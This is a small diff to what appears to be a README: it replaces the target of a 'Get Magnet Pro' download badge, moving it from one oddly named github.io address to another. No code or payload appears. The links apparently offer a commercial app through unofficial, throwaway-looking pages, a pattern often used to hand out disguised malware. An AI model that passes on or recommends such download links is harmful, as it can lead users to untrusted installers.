@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get Magnet Pro](https://img.shields.io/badge/Get_Magnet_Pro-blue?style=for-the-badge&logo=apple)](https://install-quick-software.github.io/.github/magnetpro)
+[![Get Magnet Pro](https://img.shields.io/badge/Get_Magnet_Pro-blue?style=for-the-badge&logo=apple)](https://tubus-jubus-apps.github.io/.github/magnetpro)
 
 </div>
 
